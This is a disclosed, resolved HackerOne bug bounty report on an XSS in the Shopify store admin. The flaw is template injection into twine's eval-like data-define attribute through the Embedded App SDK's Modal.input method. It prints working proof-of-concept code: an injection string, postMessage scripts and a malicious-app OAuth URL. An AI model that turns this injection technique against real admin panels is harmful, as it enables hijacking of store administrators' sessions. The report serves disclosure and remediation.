---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-generic
  - env/web
  - vuln/xss
  - vuln/code-injection
  - trigger/admin-required
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Generic"
enriched: true
body: true
date: 2017-06-01
submitted: 2017-04-02T02:33:01.281Z
bounty_usd: 1000
votes: 31
cve: []
program: "[[programs/shopify|Shopify]]"
reporter: "bored-engineer"
source: "https://hackerone.com/reports/217790"
title: "XSS in $shop$.myshopify.com/admin/ via twine template injection in 'Shopify.API.Modal.input' method when using a malicious app"
---
# XSS in $shop$.myshopify.com/admin/ via twine template injection in "Shopify.API.Modal.input" method when using a malicious app

> **Severity:** High | **Bounty:** 1,000 USD | **Votes:** 31 | **Program:** Shopify | **Disclosed:** 2017-06-01

- Report: [https://hackerone.com/reports/217790](https://hackerone.com/reports/217790)
- CWE: Cross-site Scripting (XSS) - Generic
- Submitted: 2017-04-02T02:33:01.281Z

## Report summary

This report demonstrated an XSS that could be exploited by a malicious application installed on a store to execute javascript as a store administrator. The cause of the XSS turned out to be improperly escaped user input in a lodash template.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

#Description
The Shopify [Embedded App SDK](https://help.shopify.com/api/sdks/merchant-apps/embedded-app-sdk) is used to facilitate limited interactions with parent page (`/admin/apps/$id`) from an embedded app within the shop admin interface. The SDK has multiple methods which allow an app to interact with the user which execute in the context of the admin domain and pass information back to the app. These UI elements are rendered from predefined templates using [lodash](https://lodash.com)'s [_.template](https://lodash.com/docs/4.17.4#template) method. While the method automatically provides input escaping the "input" template (used by the `Shopify.API.Modal.input` method) assigns a value to a special `data-define` attribute. While it's not possible to escape the attribute context, because the escaping is not fully context-aware it is possible to inject additional data into the attribute which is later interpreted by [twine](http://shopify.github.io/twine/). Because twine does not execute in a sandbox this template becomes an eval primitive and it possible to obtain XSS in the context of the parent application. 

#Technical Details
When the `Shopify.API.Modal.input` method the following "input" template is rendered using [lodash](https://lodash.com)'s [_.template](https://lodash.com/docs/4.17.4#template) method: 
```html
...
<div class="ui-modal__body" data-define="{typedInput: &#39;[%= value %]&#39;}">
...
<label class="next-label" for="text-a10e7047a92878fc20031f40da0b5231"></label>
<input type="text" id="text-a10e7047a92878fc20031f40da0b5231" data-bind="typedInput" autofocus="autofocus" class="next-input" />
...
<button class="btn close-modal [%= buttonClass %]" data-bind-event-click="closeModal({result: true, data: typedInput})" type="button" name="button">[%= okButton %]</button>
...
```
The `typedInput` parameter is initialized from the `value` template parameter, bound to the text input, and finally used when the "okButton" is clicked. The data binding is handled by Shopify's [twine](http://shopify.github.io/twine/) JS library. Unfortunately because  [_.template](https://lodash.com/docs/4.17.4#template) is not fully context aware it will not provide JSON escaping for this parameter. For example if `value` is set to `some'value` the following invalid JSON will be created in the `data-define` attribute:
```
{typedInput: 'some'value'}
```
Normally this would just break the intended functionality, however if we analyze [twine](http://shopify.github.io/twine/) we can discover that this type of injection can actually result in arbitrary JS execution. Twine evaluates parameters using the (wrapFunctionString)[https://github.com/Shopify/twine/blob/24c4ccfccf5b50937e6d9e433676651549be1497/dist/twine.js#L373] method:
```js
wrapFunctionString = function(code, args, node) {
  var e, error, keypath;
  if (isKeypath(code) && (keypath = keypathForKey(node, code))) {
    if (keypath[0] === '$root') {
      return function($context, $root) {
        return getValue($root, keypath);
      };
    } else {
      return function($context, $root) {
        return getValue($context, keypath);
      };
    }
  } else {
    code = "return " + code;
    if (nodeArrayIndexes(node)) {
      code = "with($arrayPointers) { " + code + " }";
    }
    if (requiresRegistry(args)) {
      code = "with($registry) { " + code + " }";
    }
    try {
      return new Function(args, "with($context) { " + code + " }");
    } catch (error) {
      e = error;
      throw "Twine error: Unable to create function on " + node.nodeName + " node with attributes " + (stringifyNodeAttributes(node));
    }
  }
};
``` 
The method wraps the attribute value in a [with](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) block to provide named variables and passes it to a [Function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function) constructor which acts as a eval primitive. This means any injection will result in JavaScript execution. For example, if the following data is used for the `value` template parameter it will flow as follows:
```
'-alert(document.domain)-'
``` 
This will result in a `data-define` attribute with the following value:
```js
{typedInput:''-document.domain-''}
```
This will result in the following code executing within twine:
```js
with($context) {
  with($registry) {
    return {typedInput: ''-alert(document.domain)-''}
  }
}
```
Putting this all together with the SDK we get the following script:
```js
window.parent.postMessage(JSON.stringify({
  message: "Shopify.API.Modal.input",
  data: {
    message: {
      message: "", 
      value: "'-alert(document.domain)-'",
    }
  }
}), "*");
```
#Exploitability
You need to convince an administrator to authorize your malicious application, however the exploit does not require any specific permissions to trigger so an admin may be more willing to authorize the application. 

#Proof of Concept
I've created an example malicious application associated with my partner account `shopify-whitehat-1@bored.engineer` to demonstrate the issue...
Open the following URL on on `$your-shop$.myshopify.com`:
```
/admin/oauth/authorize?client_id=5b7bd427b8caa69610bf85d1c87d4a04&scope=read_products&redirect_uri=https://attackerdoma.in/a4d76231-8657-48ed-8800-f1b02c7bb2ff.html&state=nonce
```
After authorizing the application an alert should appear on the `/admin` window containing `document.domain`.

#Remediation
The "input" template should be updated to make the `value` parameter context-aware, perhaps wrapping in a `JSON.stringify` call.

## Timeline

- **Report Filed**
- **2017-04-03** @bored-engineer: I wanted to add a quick note to this one, technically this issue doesn't require an admin to install a malicious application to be exploited. If a bad actor were already aware that an administrator uses an application hosted on `example.com`, they could search for XSS issues on `example.com` and using a combination of `var win = window.open("$shop$.myshopify.com/admin/apps/$id")` and `win.postMessage` from the XSS they could likely trigger this issue. I hesitate to even mention this as is a very contrived example, however it's worth mentioning as normally XSS on the application domain wouldn't have much impact with the app being iframed to a specific URL on the application domain.
- **2017-04-03** @bored-engineer: To provide a PoC for the scenario described in my previous comment, consider a shop that has the "Product Reviews" application installed which is hosted on [productreviews.shopifyapps.com](https://productreviews.shopifyapps.com/). Normally, if I were to discover XSS on a specific endpoint such as [/XSS](https://productreviews.shopifyapps.com/XSS) it wouldn't directly affect the app since a specific endpoint is loaded within the administrative interface, not the endpoint with my XSS. Ignoring that this isn't quite true due to the proxy configuration of this specific app, I would be able to use this XSS to target a specific shop. If you open any URL on [productreviews.shopifyapps.com](https://productreviews.shopifyapps.com/) and run the following JS in the console (to simulate another XSS issue) it will fire an alert in the admin panel:
```js
var win = window.open("https://$shop$.myshopify.com/admin/apps/product-reviews/");
setInterval(function() {
  win.postMessage(JSON.stringify({
    message: "Shopify.API.Modal.input",
    data: {
      message: {
        message: "", 
        value: "'-alert(document.domain)-'",
      }
    }
  }), "*");
}, 100);
```
The core issue here is the still twine injection, however you may want to consider adding an additional verification step to the `window.onmessage` handler in the admin interface. One way to accomplish this would be to provide a secret (randomly generated) to the app when first initializing, then requiring all postMessage calls from the app include this secret before being evaluated, thereby assuring all messages originated from the app's iframe.
- **Report Triaged**
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
